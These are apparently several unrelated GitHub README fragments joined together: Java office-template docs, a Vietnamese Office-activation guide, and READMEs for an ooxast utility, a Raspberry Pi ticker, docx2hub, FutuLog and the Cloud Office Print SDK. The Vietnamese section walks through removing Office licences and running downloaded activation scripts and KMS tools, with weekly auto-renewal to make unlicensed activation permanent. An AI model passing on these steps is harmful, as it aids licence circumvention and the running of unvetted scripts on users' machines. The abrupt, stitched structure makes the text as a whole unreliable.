         .setDimension(40, 15, UnitOfLength.MILLIMETERS)
         .setOverrideDimension(true);

 // Assigning ImageValue's to DataValue's
 final DataPage page = new DataPage();

 page.addValue(new DataValue(""IMAGE_1_SMALL"", image1Small));
 page.addValue(new DataValue(""IMAGE_1_LARGE"", image1Large));
 page.addValue(new DataValue(""IMAGE_2"", image2));
 page.addValue(new DataValue(""IMAGE_B"", image2)); // ImageValue's are reusable
```

# Dokument-Anweisungen mit `DocumentProcessingInstruction` übergeben
Dem Ersetzungs-Vorgang können weitere Anweisungen/Callbacks mit übergeben werden. Derzeit
mögliche Anweisungen ist das Abfangen (oder gezielte Laden) von Dokumenten-Teilen (also XML
Dateien im ZIP Container) und der Bearbeitung des XML-Baumes vor und/oder nach Ausführung des
Ersetzungs-Vorganges.

Bei LibreOffice/Apache-OpenOffice sowie Microsoft Office können dazu bei ODT und DOCX
Dateien die Kopf- und Fußzeilen im Ersetzungs-Prozess mit einbezogen werden.

Alle Anweisungen können erstellt werden über die vereinfachten Factory-Methoden in
`com.mz.solutions.office.instruction.DocumentProcessingInstruction` oder händisch durch
Implementieren der jeweiligen Klassen.

__Kopf- und Fußzeilen werden `ODT` und `DOCX` Dokumente unterstützt.__
```java
 // A document containing (maybe) a header and a footer
 final OfficeDocument anyDocument = ...

 final DataPage documentData = ...
 final DataPage headerData = ...     // Values for header placeholders
 final DataPage footerData = ...     // Values for footer placeholders

 anyDocument.generate(documentData, ResultFactory.toFile(invoiceOutput),
         DocumentProcessingInstruction.replaceHeaderWith(headerData),
         DocumentProcessingInstruction.replaceFooterWith(footerData));
         
 // a shorter way to replace header and footer if the same model is used:
 final DataPage headerFooterSameData = ...    // (same) values for header AND footer
 
 anyDocument.generate(documentData, ResultFactory.toFile(invoiceOutput),
         DocumentProcessingInstruction.replaceHeaderFooterWith(headerFooterSameData));
         
```

___Document-Interceptors werden bei beiden Office-Implementierungen unterstützt.___
```java
 final DocumentInterceptorFunction interceptorFunction = ...
 final DocumentInterceptorFunction changeCustomXml = (DocumentInterceptionContext context) -> {
     final Document xmlDocument = context.getXmlDocument();
     final NodeList styleNodes = xmlDocument.getElementsByTagName(""custXml:customers"");

     // add/remove/change XML document
     // 'context' should contain all data and access you will need
 };

 anyDocument.generate(documentData, ResultFactory.toFile(invoiceOutput),
         // Intercept main document part (document body)
         DocumentProcessingInstruction.interceptDocumentBody(
                 DocumentInterceptorType.BEFORE_GENERATION,  // invoke interceptor before
                 interceptorFunction, // change low level document function (Callback-Method)
                 dataMapForInterceptorFunctionHere), // data is optional
         // Intercept styles part of this document, maybe to change font-scaling afterwards
         DocumentProcessingInstruction.interceptDocumentStylesAfter(
                 interceptorFunction), // no data for this callback function
         // let us change the Custom XML Document Part (only MS Word) und fill with our data
         DocumentProcessingInstruction.interceptXmlDocumentPart(
                 ""word/custom/custPropItem.xml"", // our Custom XML data
                 DocumentInterceptorType.AFTER_GENERATION, // before or after doesn't matter
                 changeCustomXml));
         
```

# Removing optional/conditional paragraphs and tables in a document
Using `StandardFormatHint.*` placeholder values you are able to keep, remove or hide a paragraph. There are also placeholder values to keep or remove full tables.

Most templates contain paragraphs and/or tables that are only useful in some circumstances (conditional). Using these special placeholder values you are able to control the existence of these.

Imagine there is a document with the following content and structure of placeholders (in this case `MERGEFIELD`s):

```
  [Paragraph 1] Please pay the course registration fee now. The course fee is due two weeks before
                the course starts. { MERGEFIELD INV_P_NORMAL }
                
  [Paragraph 2] Registration fee and course fee are due two weeks before the course starts. { MERGEFIELD INV_P_TWO_WEEKS_ONLY }
  
  [Paragraph 3] Please pay the registration fee and course fee as quick as possible. { MERGEFIELD INV_P_LESS_THAN_TWO_WEEKS }
```

Depending on your data (e.g. invoice) there is the possibility to control which paragraph should remain in the generated document.

```java
  final DataPage invPage = new DataPage();
  final LocalDate courseBeginDate = ...
  final LocalDate invDate = ...
 
  final long dueDays = DAYS.between(invDate, courseBeginDate);
 
  if (dueDays > 21) {
      invPage.addValue(new DataValue(""INV_P_NORMAL"", StandardFormatHint.PARAGRAPH_KEEP));
      invPage.addValue(new DataValue(""INV_P_TWO_WEEKS_ONLY"", StandardFormatHint.PARAGRAPH_REMOVE));
      invPage.addValue(new DataValue(""INV_P_LESS_THAN_TWO_WEEKS"", StandardFormatHint.PARAGRAPH_REMOVE));
  } else if (dueDays > 14) {
      invPage.addValue(new DataValue(""INV_P_NORMAL"", StandardFormatHint.PARAGRAPH_REMOVE));
      invPage.addValue(new DataValue(""INV_P_TWO_WEEKS_ONLY"", StandardFormatHint.PARAGRAPH_KEEP));
      invPage.addValue(new DataValue(""INV_P_LESS_THAN_TWO_WEEKS"", StandardFormatHint.PARAGRAPH_REMOVE));
  } else {
      invPage.addValue(new DataValue(""INV_P_NORMAL"", StandardFormatHint.PARAGRAPH_REMOVE));
      invPage.addValue(new DataValue(""INV_P_TWO_WEEKS_ONLY"", StandardFormatHint.PARAGRAPH_REMOVE));
      invPage.addValue(new DataValue(""INV_P_LESS_THAN_TWO_WEEKS"", StandardFormatHint.PARAGRAPH_KEEP));
  }
```

The same is applicable with tables using `StandardFormatHint.TABLE_KEEP` to indicate that a table should remain in a document and that this table should be normal replaced. Using `StandardFormatHint.TABLE_REMOVE` instructs the process to fully remove a table without further replacement.

## XÓA KEY OFFICE ##
- Dùng AIO Tools để xóa
- Bấm vào đây để tham khảo https://github.com/BsNgChiThanh/ActivateAIOTools/blob/IMP/README.md
- Xoá key Office bằng đoạn code bấm [vào đây](https://1drv.ms/t/s!AmvuvqBBIcK6hyWbyZ7ms3HiWj67?e=GbuoEk)
- **Hoàn thành Kích hoạt!**

### Ghi chú ###
- Bạn có thể chuyển đổi qua lại giữa các office sau:
  - Office 2016
  - Office 2019
  - Office 2021
  - Office 365
- Chuyển đổi mà không cần cài đặt lại, giả sử bạn muốn sử dụng Office 2021 mà có một bộ cài đặt Office 2016 hoặc Office 2019 thì phải làm sao? Câu trả lời cứ cài theo bộ cài có sẵn sau đó dùng thủ thuật chuyển đổi trong vài nốt nhạc!
#### DEMO cho các bạn xem thử: ####
##### Chuyển Office 365 Enterprise sang Office 2021 Pro LTSC #####
- Tôi đang sử dụng Office 365 Enterprise:
- ![image](https://github.com/BsNgChiThanh/Kich-hoat-Office/assets/82578024/919af33b-b5bf-4d75-affe-d899917956ba)
- Tôi dùng Office Tool để xoá giấy phép Office 365, sau đó install giấy phép Office 2021 vào, https://github.com/BsNgChiThanh/OfficeTool
- ![image](https://github.com/BsNgChiThanh/Kich-hoat-Office/assets/82578024/a9b234e2-040b-408e-a010-5fba8c58c681)
- ![image](https://github.com/BsNgChiThanh/Kich-hoat-Office/assets/82578024/1f7bb1ff-6f5e-479f-b1cd-f3442535b89e)
- Sau đó nhận giấy phép Office 2021 Pro LTSC vào.
- ![image](https://github.com/BsNgChiThanh/Kich-hoat-Office/assets/82578024/2fb44de3-30f2-4864-b499-85af38ff4cbc)
- ![image](https://github.com/BsNgChiThanh/Kich-hoat-Office/assets/82578024/5605674e-e348-47b7-b023-2922d9f750f0)
- Sau đó chạy file active cmd download [từ đây](https://1drv.ms/f/s!AmvuvqBBIcK6hyTxoxQLPOKIWfW_?e=U1hqB8), hoặc source code [tại đây](https://1drv.ms/t/s!AmvuvqBBIcK6hy3HnhIRyi3c7lD_?e=V0BKtc)
- Run file:
- ![image](https://github.com/BsNgChiThanh/Kich-hoat-Office/assets/82578024/0e464f51-8a9d-4d05-9ce3-9ac55a2fa206)
- ![image](https://github.com/BsNgChiThanh/Kich-hoat-Office/assets/82578024/a0a2a877-9ee7-464f-841d-4be6f908d164)
- Đã kích hoạt 180 ngày, chúng ta tạo tác vụ gia hạn tự động hàng tuần để trở thành vĩnh viễn.
- Dùng Active AIO Tools để kiểm tra kích hoạt và tạo gia hạn kích hoạt hàng tuần: https://github.com/BsNgChiThanh/ActivateAIOTools/blob/IMP/README.md
- ![image](https://github.com/BsNgChiThanh/Kich-hoat-Office/assets/82578024/c83d7c00-5f79-4b13-b8aa-56667b424ce7)
- ![image](https://github.com/BsNgChiThanh/Kich-hoat-Office/assets/82578024/c7e8f6eb-4c31-4798-93fc-f9693fd4566a)
- ![image](https://github.com/BsNgChiThanh/Kich-hoat-Office/assets/82578024/622d7e04-952d-4e7a-8588-d423f58e1d05)
- ![image](https://github.com/BsNgChiThanh/Kich-hoat-Office/assets/82578024/36327191-0350-46f3-9997-c0755846602c)
- ![image](https://github.com/BsNgChiThanh/Kich-hoat-Office/assets/82578024/842aea24-13f3-40a7-9afb-f284246148ac)
- ![image](https://github.com/BsNgChiThanh/Kich-hoat-Office/assets/82578024/7e10579a-e57f-4835-8096-56ac5ed09369)
- OK
- Trường hợp vẫn còn Office 365 là do bạn đang sử dụng các tài khoản Office 365 A1+ hãy đăng xuất nó ra thì nó sẽ là office 2021 Pro LTSC.

##### Chuyển sang Office 2019 #####
- Các bạn làm tương tự.
- File active cmd download [từ đây](https://1drv.ms/f/s!AmvuvqBBIcK6hyTxoxQLPOKIWfW_?e=U1hqB8), hoặc source code [tại đây](https://1drv.ms/t/s!AmvuvqBBIcK6hyedGZkz3J19RqWm?e=geBxGJ)

##### Chuyển sang Office 2016 #####
- Các bạn làm tương tự.
- File active cmd download [từ đây](https://1drv.ms/f/s!AmvuvqBBIcK6hyTxoxQLPOKIWfW_?e=U1hqB8), hoặc source code [tại đây](https://1drv.ms/t/s!AmvuvqBBIcK6hyj7t3BaxKynZcX3?e=K16xtK)

##### Có thể chuyển sang Office 365 Mondo #####
- Các bạn làm tương tự.
- Nhưng phần kích hoạt Office 365 Mondo các bạn dùng KMS VL ALL AIO để kích hoạt là ok nhất: https://github.com/BsNgChiThanh/KMS_VL_ALL_AIO

## CÓ NHỮNG TRƯỜNG HỢP BỊ LỖI RẤT KHÓ CHỊU ##
- ![image](https://user-images.githubusercontent.com/82578024/185740068-23c1a28b-ee50-4cd8-9c4d-03dde7e2affd.png)
- Office không nhận bất kì một tài khoản Microsoft nào và báo lỗi kích hoạt lại, tôi đã thử nhiều cách nhưng không được, chỉ có một cách là xóa tất cả các giấy phép, dau đó intall giấy phép Office 2016, 2019 hoặc 2021 LTSC rồi gắn key kích hoạt; nếu không có key thì kích hoạt bằng cmd thì sử dụng được!
- **Hoặc xóa bỏ bộ office bằng Tool của Microsoft https://www.microsoft.com/en-us/download/100607 sau đó cài mới lại xem sao**

## Sao lưu Office và Windows ##
- Mở **NotePad** copy đoạn mã sau vào và bấm **Save As** với tên **SaoluuOfficeVaWindows.cmd** rồi Run file này dưới quyền **Run Administrator**, làm theo hướng dẫn.

# ĐẶT VẤN ĐỀ #

- Tình hình nhu cầu sử dụng key Office tăng cao trong khi nguồn key khan hiếm, chưa kể một số bạn không biết cách kích hoạt qua điện thoại, nhập nhầm key bản office nên rất khó tìm ra giải pháp kích hoạt, Mình viết bài này để giúp các bạn sử dụng office 365 thật tiện lợi! Miễn là bạn có tài khoản Microsoft cá nhân hoặc tài khoản Office 365 A1, điều đó là tốt!
- Bây giờ mình sẽ tiến hành tạo tài khoản Admin cho riêng mình, Admin này có quyền tạo 25 người dùng, và được sử dụng trong 118 ngày kể từ ngày tạo Admin, sau đó Microsoft tự gia hạn thêm 118 nữa, lập đi lập lại nhiều lần.
- Chú ý mỗi số điện thoại chỉ reget được một admin duy nhất!

# LIÊN KẾT MIỀN #

Miền được tạo ra trong trường hợp này dài, đôi khi khó nhớ ví dụ: xyzab.onmicrosoft.com ... Thế thì chúng ta dùng một tên miền ngắn như bsthanh.tk, tieuho.tk để làm được điều này một số bạn mua miền rất tốn kém, hãy dùng miễn phí tại đây:

```php
https://www.freenom.com
```
Sử dụng 12 tháng miễn phí, trước lúc hết hạn 14 ngày bạn vào đó gia hạn miễn phí thêm 12 tháng tiếp tục và lập đi lập lại!

# ooxast-util-remove-rsid

[![npm version](https://badge.fury.io/js/ooxast-util-remove-rsid.svg)](https://badge.fury.io/js/ooxast-util-remove-rsid) [![npm downloads](https://img.shields.io/npm/dm/ooxast-util-remove-rsid.svg)](https://www.npmjs.com/package/ooxast-util-remove-rsid)

Cleans all the rsid tags from an ooxast tree, and merges `w:r` elements if they only differ by rsid values.

Rsid's are Word's way of keeping track of edits, but when you are converting or manipulating the ooxast tree you usually do not want to keep this information around anyway. Rsids end up being incredibly annoying as they split up elements which do not need to be split up for the purposes of creating and manipulating the AST.

jprusik,mini-ticker,,https://github.com/jprusik/mini-ticker,https://api.github.com/repos/mini-ticker/jprusik,A mini ticker display for your desk; written in Python for the Raspberry Pi Zero ,"# Mini Ticker

This project is a purpose-built solution for retrieving and displaying various information that is important to the author.

Additionally, it has configured interfaces (button presses, NFC/RFID card/tag scan) which can trigger arbitrary actions (e.g. send magic packet). It aims to have a small footprint, with minimal maintenance.

The code provided here is based on examples ([1](https://github.com/adafruit/Adafruit_CircuitPython_SSD1306/tree/master/examples), [2](https://github.com/ondryaso/pi-rc522/tree/master/examples)) from the [pi-rc522](https://github.com/ondryaso/pi-rc522) and [adafruit-circuitpython-ssd1306](https://github.com/adafruit/Adafruit_CircuitPython_SSD1306) projects.

## Requirements

- Raspberry Pi computer with installed header pins and power source
- [compatible](https://www.raspberrypi.org/documentation/installation/sd-cards.md) microSD/SD card
- SSD1306-based 128x64 or 128x32 pixel OLED display (I2C)
- (Optional) RC522 module (for RFID/NFC communication)

## Setup

- [Install Raspbian (Lite)](https://www.raspberrypi.org/downloads/raspbian/) on a microSD/SD card
- Set up the Raspberry Pi to run headless and connect it to your network ([guide](https://www.raspberrypi.org/documentation/configuration/wireless/headless.md))
- [ssh into the Raspberry Pi](https://www.raspberrypi.org/documentation/remote-access/ssh/):
- Do `sudo raspi-config` and set up:
  - ""Interfacing Options"" > ""Interfacing Options"" > ""I2C"" > select ""Yes""
  - (Optional) ""Localisation Options""
  - (Optional) ""Change User Password""
    **Important!** Because we're using a Raspberry Pi, the default user is `pi` with a password of `raspberry` - it is strongly advised to change the password, at minimum.
- Install dependencies:

  ```shell
  sudo apt update && sudo apt-get install git python3-pip python3-dev libtiff5-dev libopenjp2-7-dev
  ```

- (Optional) Enable Wake-on-LAN packet sending `sudo apt-get install etherwake`
- (Optional) If using a Temperature / Humidity sensor, do `sudo apt-get install libgpiod2`
- Clone this repo and `cd mini-ticker`
- Install required packages with `pip3 install -r requirements.txt`
- (Optional) Edit `/boot/config.txt` at the line `dtparam=i2c_arm=on` and replace it with:

  ```shell
  dtparam=i2c_arm=on,i2c_arm_baudrate=400000
  ```

- (Optional) If using an RC522 module for RFID/NFC communication, edit `/boot/config.txt` to include the following settings:

  ```settings
  device_tree_param=spi=on
  dtoverlay=spi-bcm2708
  dtparam=spi=on
  ```

- Edit or create `.env` in the same directory as `status_display.py` with the following contents:

  ```shell
  DHT11_PIN=4
  ```

## Running the code

Once the `ticker.py` script is executed, it will continue to run until the process is terminated. You can manually execute the script on demand, or automatically execute on shell start by editing `/etc/profile` and appending the following to the end of the file (update the file path as needed):

```shell
python3 /home/pi/mini-ticker
```

Alternatively, run any given script as a service:

- Run `sudo systemctl --force --full edit mini-ticker.service` and enter the config:

  ```config
  [Unit]
  Description=Mini Ticker
  Requires=network.target
  After=multi-user.target

  [Service]
  WorkingDirectory=/home/pi/mini-ticker
  User=pi
  ExecStart=python3 .
  ExecStopPost=python3 -c 'import ticker; ticker.shutdown()'

  [Install]
  WantedBy=multi-user.target
  ```

- Enable the service with `sudo systemctl enable --now mini-ticker.service`, and start it with `sudo systemctl start mini-ticker.service`

Other scripts that listen for triggers (e.g. card scan, button press) can be executed in the same way.

## Notes

- This build assumes Raspberry Pi Zero hardware - no other Raspberry Pi hardware has been tested with this code.
- [Ubuntu Font Family](https://design.ubuntu.com/font/) is included in `/fonts` by default. If you wish to use a different font, add them to the `/fonts` directory and update the import references in `ticker.py` (note, line spacing currently presumes Ubuntu fonts and may require adjustments when using other fonts).
- Tip: You can access the the target pi on your network using the pi's network DNS reference (`raspberrypi` by default). This is particularly useful if your network has dynamic IP address assignment; you can simply `ssh pi@raspberrypi.local`)

```

## Requirements

At least Java 1.7 is required.

## Clone this project

This project depends on Git submodules. Therefore you have to clone it with the `--recursive` option to get the submodules, too:

```
git clone https://github.com/transpect/docx2hub-frontend --recursive
```

## Invocation

### Bash

For convenient use on command line, we provide a simple Bash script. You can run it in this way:
```
`./docx2hub.sh sample/hello-word.docx
```

### Calabash

We provide also Bash and Windows Batch scripts to invoke the XProc pipeline directly:

```
./calabash.sh -o result=sample/hello-word.xml xpl/docx2hub-frontend.xpl docx=sample/hello-word.docx
```

## Include docx2hub in your XProc project

[![Build](https://github.com/futurice/futuLog/actions/workflows/ci.yml/badge.svg)](https://github.com/futurice/futuLog/actions/workflows/ci.yml)

This is a tool that was born out of two needs at Futurice:

1. To enable proper social distancing, the available spots in the office have to be reduced and it should be easily visible if there is still space left for you

2. In case of a positive COVID-19 case, it should be possible to query who was in the office with that person over the last two weeks in order to contact them and get tested too

The result is FutuLog! A normal user can set a default office that they work from and book slots in the office, either for the current day or for the future. Other users can see who has booked for a given day.

Administrators (e.g. Human Care or Office Management staff) can set the number of allowed people per office and query/export the list of people that were in contact with a given user.

## Deployment

FutuLog can use any OpenID Connect compliant identity provider. It is tested with [Okta](https://www.okta.com/) and [Keycloak](https://www.keycloak.org/). The [Dockerfile](./Dockerfile) builds a minimal debian container that only contains the backend server and the static frontend. It needs [Buildkit](https://docs.docker.com/develop/develop-images/build_enhancements/) in order to work. Use for example this command to build the container:

```bash
DOCKER_BUILDKIT=1 docker build -t ""futurice/futulog:$(git rev-parse --short HEAD)""
```

Note that a clean build of the container will take roughly 30 minutes. It might also be necessary to allow docker to use 4GB of memory.

The container expects the following environment variables (see the [`docker-compose.yaml` file](./docker-compose.yaml)):
- `DB_URL`: The URL including username of password of the PostgresQL database
- `INITIAL_ADMIN`: The email address of a person that should be administrator. Other administrators can be added afterwards by this person
- `PUBLIC_URL`: The URL under which futulog is publicly accessible
- `OPENID_CLIENT_ID`: The client id of the OpenID Connect application that is used to authenticate users
- `OPENID_SECRET_TEXT`: The pre-shared secret to authorize futuLog to talk to the identity provider
- `OPENID_CONFIG_URI`: Where to find the discovery document for OpenID Connect. Usually this is `<identity provider url>/.well-known/openid-configuration`

## Local testing

To try out the whole application locally, the [`docker-compose.yaml` file](./docker-compose.yaml) launches futuLog together with Keycloak as identity provider and defines three users: `testuser1` (administrator), `testuser2` and `testuser3` (passwords are the same as the usernames). To build and run the container use this command (to run the containers in the background add `-d` at the end):

```bash
DOCKER_BUILDKIT=1 docker-compose build && docker-compose up
```
After everything is initialized, futuLog will be available at `http://localhost:8000`.

Again, a clean build will take roughly 30 minutes and docker might need up to 4GB of memory.

## Development

### Backend

The backend is written in Haskell, using the [`servant`](https://github.com/haskell-servant/servant) and the [`postgresql-simple`](https://hackage.haskell.org/package/postgresql-simple) libraries. To compile the backend outside of the docker-container, you need to have [`stack`](https://docs.haskellstack.org/en/stable/README/) installed on your machine. Then run:

```bash
cd backend
stack build
```
The first build will pull and compile all the dependencies, so it will take about 30 minutes to finish. After that all the dependencies are cached and only the changed source code files will be recompiled.

As the server also needs the identity provider and several environment variables, it is the easiest to use docker-compose to run it:
```bash
DOCKER_BUILDKIT=1 docker-compose build && docker-compose up
```

The backend API is fully documented with an OpenAPI spec. After running the container you can explore the API at http://localhost:8000/swagger-ui or import http://localhost:8000/swagger.json with the OpenAPI tooling of your choice.

### Frontend

The frontend is written in TypeScript with React. To set everything up run:

```bash
cd frontend && npm install && npm run build
```

For development the dev-server can be used. First uncomment the line in the [`docker-compose.yaml`](./docker-compose.yaml) that specifies the `PUBLIC_URL` as `http://localhost:3000` and comment the original line. Then recreate the containers and run the dev server:

```bash
docker-compose up -d && npm run dev:frontend
```

## Deployment inside Futurice

To deploy this within Futurice, use the [`deploy.sh`](./deploy.sh) script. First configure a AWS profile as described [here](https://welcome.play.futurice.com/). Then set the environment variable `AWS_PROFILE` to that profile name. The script takes the following arguments:

```
$ export AWS_PROFILE=<name>
$ ./deploy.sh [staging|production|cd] [--dry-run]
```

`cd` is intended to use for continous delivery to staging only. `--dry-run` will only build the docker container, but neither push it to the registry nor deploy it. It will print the kubernetes yaml it would apply to stdout.

This project provides a Java interface for Cloud Office Print.

# Installation
## .jar
To install the Cloud Office Print Java package you can download the .jar file of the project and add it to the build path of your project. The .jar file can be found on the [Maven Central Repository](https://search.maven.org/artifact/com.cloudofficeprint/cloudofficeprint). Select the latest version of Cloud Office Print, select `Downloads` in the top right corner and choose `jar` to download our .jar file.
### Eclipse
In [Eclipse](https://www.eclipse.org/) create a new Java project or use an existing one. After downloading our .jar file, you can add it to the project by creating a 'lib'-folder on the same level as the 'src'-folder and putting the .jar file inside the 'lib'-folder.

Next, you have to add the .jar file to the classpath of the project. You can do so by right-clicking the root folder of your project and clicking 'Build Path > Configure Build Path...'. Go to the tab 'Libraries', click on 'Classpath' and click on 'Add JARs...'. Navigate to your 'lib'-folder in your project and select our .jar file. Finally, click 'Apply and Close' and we're done.

## Gradle
To use the Cloud Office Print Java package in a Gradle project, you can add it as a dependency to your `build.gradle` file. This project is uploaded to Maven Central, so in the `build.gradle` file you have to include the Maven Central repository:
```gradle
repositories {
    mavenCentral()
}
```
The entry to put inside the `dependencies`-object in the `build.gradle` file can be found on our [Maven Central Repository](https://search.maven.org/artifact/com.cloudofficeprint/cloudofficeprint) and selecting the latest version. It will look like the following command where the version is changed to the latest version which can be found on our [Maven Central Repository](https://search.maven.org/artifact/com.cloudofficeprint/cloudofficeprint).
```gradle
dependencies {
    implementation 'com.cloudofficeprint:cloudofficeprint:21.2.0'
}
```
or
```gradle
dependencies {
    implementation group: 'com.cloudofficeprint', name: 'cloudofficeprint', version: '21.2.0'
}
```

## Maven
To use the Cloud Office Print Java package in a Maven project, you can add it as a dependency to your `pom.xml` file. This project is uploaded to Maven Central, so in the `pom.xml` file you have to include the Maven Central repository. The entry to put inside the `pom.xml` file can be found on our our [Maven Central Repository](https://search.maven.org/artifact/com.cloudofficeprint/cloudofficeprint) and selecting the latest version. It will look like the following command where the version is changed to the latest version which can be found on our [Maven Central Repository](https://search.maven.org/artifact/com.cloudofficeprint/cloudofficeprint).
```xml
<dependencies>
    <dependency>
        <groupId>com.cloudofficeprint</groupId>
        <artifactId>cloudofficeprint</artifactId>
        <version>21.2.0</version>
    </dependency>
</dependencies>
```

# Usage
1. Create a template (docx, xlsx, pptx, HTML, md, txt, csv), for the possible tags, click [here](http://www.cloudofficeprint.com/docs/#templates).
2. Create the input data with this Java SDK
3. Send template and data to a Cloud Office Print server and save the response to a file with this Java SDK

To see the JSON-data that is sent to the Cloud Office Print server together with some information about the requests and responses, you can turn on verbose-mode by first creating a `Server`-object and then calling `.setVerbose(true)` on that object.

# Quickstart: Hello World example
## Template (docx)
<img src=""https://raw.githubusercontent.com/United-Codes/cloudofficeprint-java/main/imgs/hello_world_template.png"" width=""600"" />

## Code (SDK)
First we add the data needed to fill in the template, which can be seen in the code below. The template and the data need to be sent to a Cloud Office Print server that merges both. This can be done by setting up the configuration for the Cloud Office Print server and passing it to the print job instance, which can also be seen in the code below. You can get your API key by signing up at https://www.cloudofficeprint.com.
```java
package HelloWorld;

import java.util.Hashtable;

import com.cloudofficeprint.PrintJob;
import com.cloudofficeprint.Response;
import com.cloudofficeprint.Output.Output;
import com.cloudofficeprint.RenderElements.ElementCollection;
import com.cloudofficeprint.RenderElements.Property;
import com.cloudofficeprint.RenderElements.RenderElement;
import com.cloudofficeprint.Resources.Base64Resource;
import com.cloudofficeprint.Server.Server;

public class HelloWorld {
	public static void main(String[] args) throws Exception {
		// Main object that holds the data
		ElementCollection collection = new ElementCollection(""data"");

		// Create the title element and add it to the element collection
		Property title = new Property(
				""title"",
				""Hello World!""
		);
		collection.addElement(title);

		// Create the text element and add it to the element collection
		Property text = new Property(
		    ""text"",
		    ""This is an example created with the Cloud Office Print Java SDK""
		);
		collection.addElement(text);
		
		//Set-Up Cloud Office Print server
        Server copServer = new Server(""https://api.cloudofficeprint.com/"");
        copServer.setVerbose(true);
        copServer.setAPIKey(""YOUR_API_KEY""); // Replace by your own API key
        
        // Load template
        Base64Resource base64Resource = new Base64Resource();
        base64Resource.setFileFromLocalFile(""./data/template.docx"");
        
        // Create the data object which uses the data collection
        Hashtable<String, RenderElement> data = new Hashtable<String, RenderElement>();
        data.put(""data"", collection);
		
        // Specify the output configuration and create the print job
		Output output = new Output(null, ""raw"", ""libreoffice"", null, null, null, null);
        PrintJob printJob = new PrintJob(data, copServer, output, base64Resource, null, null, null, null);

        // Execute the print job, which sends the template and data to the Cloud Office Print server and receives the server reponse
        Response response = printJob.execute();

        // Save the server response (output file) to your computer
        response.downloadLocally(""./data/output"");
	}
}
```

## Run Java Code
### Eclipse
To run the HelloWorld.java file in Eclipse, you can right-click inside the editor of the HelloWorld.java file, then choose 'Run As > 1 Java Application'.

### Visual Studio Code
To run the HelloWorld.java file in Visual Studio Code, there should be a 'Run'-button in the editor above the main()-function which you can click. Another way to run the HelloWorld.java file in Visual Studio Code is to right-click inside the editor of the HelloWorld.java file and then choose 'Run Java'.

## File structure
The structure of the Eclipse Java project can be seen below.

<img src=""https://raw.githubusercontent.com/United-Codes/cloudofficeprint-java/main/imgs/hello_world_file_structure.png"" width=""200"" />

## Result
<img src=""https://raw.githubusercontent.com/United-Codes/cloudofficeprint-java/main/imgs/hello_world_output.png"" width=""600"" />

# Other examples
Going through the other examples is also recommended as this gives you a good idea on how to use the SDK. The examples are:
- general examples: Examples.java
- multiple request merge example: MultipleRequestMergeExample.java
- pdf signature example: PDFSignatureExample.java
- order confirmation example: OrderConfirmationExample.java
- solar system example: SolarSystemExample.java
- SpaceX example: SpaceXExample.java (the most extensive example)

The examples can be found in the directory 'src/main/java/com/cloudofficeprint/Examples' of the project on [Github](https://github.com/United-Codes/cloudofficeprint-java). Each example has a markdown file explaining everything about that example.

The examples can be run from the Main.java file, which can be found in the directory 'src/com/CloudOfficePrint/' of the project on [Github](https://github.com/United-Codes/cloudofficeprint-java). In the Main.java file you can uncomment the examples you want to run.

## Run examples in Eclipse
See the [quickstart example](#quickstart-hello-world-example) for how to run code in Eclipse. You have to pass your API key as an argument when running the Main.java file. To do this, right-click inside the editor of the Main.java file and select 'Run As > Run Configurations...'. Then open the tab 'Arguments' and enter your API key inside the 'Program arguments' box and click 'Run'.

## Run examples in Visual Studio Code
See the [quickstart example](#quickstart-hello-world-example) for how to run code in Visual Studio Code. You have to pass your API key as an argument when running the Main.java file. To do this, you have to create a `launch.json` file inside the `.vscode`-folder with the following structure:
```json
{
    ""configurations"": [
        {
            ""type"": ""java"",
            ""name"": ""Launch Main"",
            ""request"": ""launch"",
            ""mainClass"": ""com.cloudofficeprint.Main"",
            ""projectName"": ""cloudofficeprint-cloudofficeprint"",
            ""args"": ""dummy_api"",
        }
    ]
}
```
where you replace `dummy_api` with your API key.

# Documentation

The documentation for this SDK can be found inside the folder `build/docs/javadoc/` on [Github](https://github.com/United-Codes/cloudofficeprint-java).

The Cloud Office Print documentation can be found at the [Cloud Office Print docs](https://www.cloudofficeprint.com/docs/).

# Development
This is a [Gradle](https://gradle.org/) project.

## Tests 
To check if everything works, you can run the tests.
### Gradle
See the [Gradle section](#run-tests).  

### Visual Studio Code
In VSCode, you can simply run the tests by opening a test file and there should appear a green button next to each test to run it.

### Eclipse
To run the tests in Eclipse, you can either right-click a test file in the package explorer or right-click in the editor of an opened test file. Then choose 'Run As > Gradle Test' or 'Run As > JUnit Test'.

## Documentation
To generate the documentation, see the [Gradle section](#generate-documentation). In Eclipse, select the root folder, click 'Project' in the top bar and click 'Generate Javadoc...'.

## Compiling
### Gradle
See the [Gradle section](#building-and-generating-jar-file).
### Terminal
To compile the Java code in the terminal with javac, you first have to make sure that you have a Java Development Kit installed (JDK). You can check if javac is available by typing `javac --version` in your terminal and verifying that your version of javac is shown. If you do not have a JDK installed, you can get OpenJDK from their [website](https://openjdk.java.net/).

Next, you open a terminal and change your directory to the 'javaProject'-folder. If you are in the 'javaProject'-folder, you can run the following command to compile all the .java files inside the 'src'-folder into a folder called 'bin':
```bash
javac -d bin -cp \* $(find src -name '*.java')
```
The `-cp \*` includes all the .jar files in the 'javaProject'-folder.

## Creating the .jar
Once the project is compiled, a .jar file of the project can be created. This .jar file can then be used to import this Java SDK in a project.
### Gradle
See the [Gradle section](#building-and-generating-jar-file).
### Eclipse
Open the Java SDK project in Eclipse. Right-click on the root folder of the Java SDK and choose 'Export...'. Then open the 'Java'-folder and select 'JAR file'. Finally choose the output directory, leave the default settings and click 'Finish'.
### Terminal
Open a terminal and change your directory to the folder you compiled the project to (e.g. the bin-folder of the previous section). Then enter the following command to create the .jar file:
```bash
jar cvf javaProject.jar -C . .
```

## Importing .jar via terminal
To import the project, you can use the created .jar file. Let's say we're working with our [HelloWorld example project](#quickstart:-hello-world-example). The file structure of that project can be seen in [this section](#file-structure). After the necessary .jar file is placed in the 'lib'-folder (see [HelloWorld example project](#quickstart:-hello-world-example)), we can compile our HelloWorld.java file. We use javac for this and we need to make sure to include the .jar file in the command.

Open a terminal and change the directory to the root folder 'helloWorld'. If you type `ls` on Linux or `dir` on Windows, the folders 'bin', 'data', 'lib' and 'src' should be displayed. Then type the following command:
```bash
javac -cp ""$(printf %s: lib/*.jar)"" src/helloWorld/HelloWorld.java
```
The `-cp ""$(printf %s: lib/*.jar)""` includes the .jar files inside the 'lib'-folder.

Finally, to run the compiled version of the HelloWorld.java file, you first change your directory to the 'src'-folder. Then you type the following command:
```bash
java -cp ""$(printf %s: ../lib/*.jar)"" helloWorld.HelloWorld
```
Again, the `-cp ""$(printf %s: ../lib/*.jar)""` includes the .jar files from the 'lib'-folder.

